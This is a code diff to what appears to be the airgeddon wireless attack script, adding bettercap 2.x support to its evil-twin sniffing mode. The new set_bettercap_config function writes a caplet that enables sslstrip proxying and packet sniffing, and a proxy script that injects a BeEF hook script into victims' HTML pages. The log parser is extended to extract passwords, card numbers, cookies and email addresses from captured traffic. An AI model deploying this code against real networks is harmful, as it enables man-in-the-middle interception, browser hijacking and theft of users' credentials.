@@ -217,10 +217,12 @@ bettercap_proxy_port="8080"
 bettercap_dns_port="5300"
 minimum_bettercap_advanced_options="1.5.9"
 minimum_bettercap_fixed_beef_iptables_issue="1.6.2"
-maximum_bettercap_supported_version="1.6.2"
+bettercap2_version="2.0"
 sslstrip_file="ag.sslstrip.log"
 ettercap_file="ag.ettercap.log"
 bettercap_file="ag.bettercap.log"
+bettercap_config_file="ag.bettercap.cap"
+bettercap_hook_file="ag.bettercap.js"
 beef_port="3000"
 beef_control_panel_url="http://127.0.0.1:${beef_port}/ui/panel"
 jshookfile="hook.js"
@@ -4435,6 +4437,8 @@ function clean_tmpfiles() {
 	rm -rf "${tmpdir}parsed_file" > /dev/null 2>&1
 	rm -rf "${tmpdir}${ettercap_file}"* > /dev/null 2>&1
 	rm -rf "${tmpdir}${bettercap_file}"* > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
 	rm -rf "${tmpdir}${beef_file}" > /dev/null 2>&1
 	if [ "${beef_found}" -eq 1 ]; then
 		rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
@@ -4983,12 +4987,6 @@ function beef_pre_menu() {
 				if check_interface_wifi "${interface}"; then
 					et_mode="et_sniffing_sslstrip2"
 					get_bettercap_version
-					if compare_floats_greater_than "${bettercap_version}" "${maximum_bettercap_supported_version}"; then
-						echo
-						language_strings "${language}" 174 "red"
-						language_strings "${language}" 115 "read"
-						return
-					fi
 					et_dos_menu
 				else
 					echo
@@ -7484,6 +7482,55 @@ function exec_et_captive_portal_attack() {
 	clean_tmpfiles
 }
 
+#Create configuration files for bettercap
+function set_bettercap_config() {
+
+	debug_print
+
+	tmpfiles_toclean=1
+	rm -rf "${tmpdir}${bettercap_config_file}" > /dev/null 2>&1
+	rm -rf "${tmpdir}${bettercap_hook_file}" > /dev/null 2>&1
+
+	{
+	echo -e "net.recon off\n"
+	echo -e "set http.proxy.port ${bettercap_proxy_port}"
+	echo -e "set http.proxy.script ${bettercap_hook_file}"
+	echo -e "set http.proxy.sslstrip true"
+	echo -e "http.proxy on\n"
+	echo -e "set net.sniff.verbose true"
+	echo -e "net.sniff on\n"
+	echo -e "events.ignore net.sniff.http.response"
+	echo -e "events.ignore http.proxy.spoofed-response"
+	echo -e "events.ignore net.sniff.dns"
+	echo -e "events.ignore net.sniff.tcp"
+	echo -e "events.ignore net.sniff.udp"
+	#echo -e "events.ignore net.sniff.mdns"
+	#TODO experimental
+	#echo -e "events.ignore net.sniff.dhcp"
+	} >> ${tmpdir}${bettercap_config_file}
+
+	if [ ${bettercap_log} -eq 1 ]; then
+		{
+		echo -e "set events.stream.output ${tmp_bettercaplog}"
+		} >> ${tmpdir}${bettercap_config_file}
+	fi
+
+	{
+	echo -e "function onLoad() {"
+	echo -e "\tlog('BeefInject loaded.');"
+	echo -e "\tlog('targets: ' + env['arp.spoof.targets']);"
+	echo -e "}\n"
+	echo -e "function onResponse(req, res) {"
+	echo -e "\tif (res.ContentType.indexOf('text/html') == 0) {"
+	echo -e "\t\tvar body = res.ReadBody();"
+	echo -e "\t\tif (body.indexOf('</head>') != -1) {"
+	echo -e "\t\t\tres.Body = body.replace('</head>', '<script type=\"text/javascript\" src=\"http://${et_ip_router}:${beef_port}/${jshookfile}\"></script></head>');"
+	echo -e "\t\t}"
+	echo -e "\t}"
+	echo -e "}"
+	} >> ${tmpdir}${bettercap_hook_file}
+}
+
 #Create configuration file for hostapd
 function set_hostapd_config() {
 
@@ -9301,14 +9348,20 @@ function launch_bettercap_sniffing() {
 	recalculate_windows_sizes
 	sniffing_scr_window_position=${g4_bottomright_window}
 
-	if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
-		bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
-	fi
+	if compare_floats_greater_or_equal "${bettercap_version}" "${bettercap2_version}"; then
+		set_bettercap_config
+		#TODO test this for bettercap 2.x
+		bettercap_cmd="bettercap -iface ${interface} -no-history -caplet ${tmpdir}${bettercap_config_file}"
+	else
+		if compare_floats_greater_or_equal "${bettercap_version}" "${minimum_bettercap_advanced_options}"; then
+			bettercap_extra_cmd_options="--disable-parsers URL,HTTPS,DHCP --no-http-logs"
+		fi
 
-	bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
+		bettercap_cmd="bettercap -I ${interface} -X -S NONE --no-discovery --proxy --proxy-port ${bettercap_proxy_port} ${bettercap_extra_cmd_options} --proxy-module injectjs --js-url \"http://${et_ip_router}:${beef_port}/${jshookfile}\" --dns-port ${bettercap_dns_port}"
 
-	if [ ${bettercap_log} -eq 1 ]; then
-		bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
+		if [ ${bettercap_log} -eq 1 ]; then
+			bettercap_cmd+=" -O \"${tmp_bettercaplog}\""
+		fi
 	fi
 
 	xterm -hold -bg black -fg yellow -geometry "${sniffing_scr_window_position}" -T "Sniffer+Bettercap-Sslstrip2/BeEF" -e "${bettercap_cmd}" > /dev/null 2>&1 &
@@ -9360,12 +9413,13 @@ function parse_ettercap_log() {
 #Parse bettercap log searching for captured passwords
 function parse_bettercap_log() {
 
+	#TODO test for bettercap 2.x
 	debug_print
 
 	echo
 	language_strings "${language}" 304 "blue"
 
-	local regexp='USER|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE'
+	local regexp='USER|PASS|CREDITCARD|COOKIE|PWD|USUARIO|CONTRASE|CORREO|MAIL'
 	local regexp2='USER-AGENT|COOKIES|BEEFHOOK'
 	readarray -t BETTERCAPLOG < <(cat < "${tmp_bettercaplog}" 2> /dev/null | grep -E -i ${regexp} | grep -E -vi ${regexp2})
 
